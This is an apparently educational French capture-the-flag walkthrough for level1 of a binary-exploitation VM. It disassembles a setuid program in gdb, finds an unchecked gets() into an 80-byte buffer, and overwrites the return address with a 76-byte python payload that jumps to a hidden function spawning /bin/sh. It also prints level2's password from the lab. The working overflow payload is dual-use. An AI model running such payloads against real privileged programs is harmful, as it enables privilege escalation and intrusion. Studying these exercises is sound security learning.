WALKTHROUGH LEVEL1 

---> pwd : /home/user/level1

# ls
---> #ls -la :
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

=> nous disposons d'un fichier level1, appartenant à level2. Pour les 
permissions user/group/other :
- permission s sur la partie user : bit SUID (setuid) activé donc il ne
	s'exécute qu'avec les privilèges du owner (ici level2) et non avec les
	privilèges du user (ici level1)
- permission s sur la partie group : bit GUID (getuid) activé sur 
	l'execution. Quand ce fichier est exécuté, le processus s'exécute avec
	les permissions du groupe owner (level2) en plus de celles de l'owner
	du fichier.
- permission + : des ACL (listes de contrôle d'accès) sont appliquées.

# getfacl
---> getfacl level1 (pour voir les ACL) : 
#file: level1
#owner: level2
#group: users
#flags: ss-
user::rwx
user:level2:r-x
user:level1:r-x
group::---
mask::r-x
other::---

# file
---> file level1 (quel est le type de ce fichier)
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1
(SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID
[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped

=> A retenir des info de file : 
- setuid et getuid : le processus s'execute avec les droits du owner et du
	group owner
- version 1 (SYSV) : compilé avec le standard SYSV (= System V, version
	historique de UNIX developpée par AT&T, entreprise de telecommunication
	américaine) SYSV est la base du système Posix, utilisé par Linux
- dynamically linked : Au lieu d'intégrer le code de chaque bibliothèque 
	utilisée directement dans l'exécutable final (comme c'est le cas avec 
	le lien statique), un programme dynamiquement lié contient des 
	références aux bibliothèques qu'il utilise. Lorsque le programme est 
	exécuté, le système d'exploitation charge ces bibliothèques en mémoire.
- not stripped : donc contient des symboles de débogage

---> ./level1
Ne fait rien. Le programme attend une entrée puis s'arrête apres enter

# disas main
---> GDB : gdb level1 / disas main 

Dump of assembler code for function main:
   0x08048480 <+0>:		push   %ebp	/Save la base pointer actuelle sur la pile.
   0x08048481 <+1>:		mov    %esp,%ebp /Cree un nv base pointer pour la fct
   0x08048483 <+3>:		and    $0xfffffff0,%esp /Aligne le pointer sur 16o perf
   0x08048486 <+6>:		sub    $0x50,%esp /Alloc 1 buffer de 80o sur stack
   0x08048489 <+9>:		lea    0x10(%esp),%eax /charge l'adresse du tampon dans le registre eax avec 16o en plus... C'est la que commence le tampon !
   0x0804848d <+13>:	mov    %eax,(%esp) /place le debut du tampon sur le haut de la stack pour que gets puisse l'utiliser comme argument
   0x08048490 <+16>:	call   0x8048340 <gets@plt> /appel de la fonction gets
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

=> on repère les call : on a l'appel a une fonction gets@plt
PLT = Procedure Linkage Table. Cela sert a appeler des fonctions externes
dont l'adresse est inconnue au moment du linking et qui ne sera connue qu'au
moment de la liaison dynamique lors de l'exécution.

Donc le programme appelle la fonction gets d'une bibliothèque partagée. La
fonction gets est une fonction C connue pour sa vulnérabilité aux débordements
de tampon !! En effet, elle ne vérifie pas la taille de l'entrée par rapport à
la taille du tampon de destination. Elle continuera à lire les caractères et à 
les stocker dans le tampon jusqu'à ce qu'elle rencontre une nouvelle ligne ou 
la fin de fichier, sans se soucier des limites du tampon.

Ce tampon est de 80 octets (0x50)

On va essayer de faire un Buffer Overflow, surtout que sur cette VM, les
protections Canary sont désactivées...

# Info function
---> GDB : gdb level1 / #info function (liste toutes les fonctions du programme)

All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

=> la plupart des fonctions répertoriées (gets, fwrite, system) font partie de
bibliothèques partagées comme l'atteste le @plt qui suit. Il reste deux fonctions
propres au programme level1 : main et run. Lorsqu'on a desassemblé la fonction 
main, on n'a pas vu d'appel à run... Alors ?

---> GDB : set disassembly-flavor intel
Ce debugger peut utiliser 2 syntaxes :
- AT&T (La source est spécifiée avant la destination)
- Intel (la destination est spécifiée avant la source) et donne des précisions

# disas run
---> GDB : gdb level1 / disas run

Dump of assembler code for function run:
   0x08048444 <+0>:		push   ebp /-> debut de la fonction run
   0x08048445 <+1>:		mov    ebp,esp
   0x08048447 <+3>:		sub    esp,0x18
   0x0804844a <+6>:		mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 /-> argument de la fct system qui suit
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.

=> A retenir de ces info : 
- la fonction run commence a l'offset 0x08048444
- la syntaxe Intel nous avertit que certaines opérations sont effectuées avec
	un type de données DWORD PTR, càd un double word 32 bits
- run envoie a la fonction system() un argument enregistré sur l'offset 0x8048584
system() sert a executer une commande shell. L'adresse placée avant est la
commande à exécuter ! 

On vérifie avec : gdb x/s 0x8048584
0x8048584:	 "/bin/sh"

Si on vérifie les autres offset présents dans la fonction run : 
gdb x/s 0x80497c0 -> 0x80497c0 <stdout@@GLIBC_2.0>:	 ""
gdb x/s 0x8048570 -> 0x8048570:	 "Good... Wait what?\n"

Mmmmmh... Attend, quoi ?

DONC la commande run, repertoriée dans le programme level1, lance un shell...
Mais elle écrit d'abord un texte : Good... Wait what?
L'objectif est donc de forcer l'appel a la fonction run, grâce à un buffer
overflow. 

---> On va faire un buffer overflow : 
on veut envoyer 80 caractères en guise d'input pour notre programme. 
donc on va créer un fichier /tmp/buffertrick et l'injecter via gdb : 
he
1) creation du fichier :
python -c 'print "a"*80' > /tmp/buffertrick
cat /tmp/buffertrick
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

2) injection :
gdb level1
run < /tmp/buffertrick
Starting program: /home/user/level1/level1 < /tmp/buffertrick

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()

Ok Donc avec 80 caractères, on a bien un buffer overflow -> segfault !

3) ajout du pointeur dans notre script :
on sait que la commande run commence à l'adresse 0x08048444
Au lieu de mettre 80 caractères de padding, on en met 76 et les 4 derniers
seront consacrés à l'ajoute de cette adresse sous le forma little-endian
(c'est à dire qu'on la rentre à l'envers)

python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/buffertrick

4) injection dans run :

cat /tmp/buffertrick | ./level1
Cela segfault immédiatement. Le trick : on veut que notre cat reste ouvert
et puisse recevoir un input depuis l'entrée standard, sinon le programme
s'exécute trop vite et on n'a pas le temps de faire notre commande. Cela est
possible en ajoutant - avant le pipe : cela laisse ouvert notre cat, qui reste
en attente d'une entrée via standard + enter.

cat /tmp/buffertrick - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77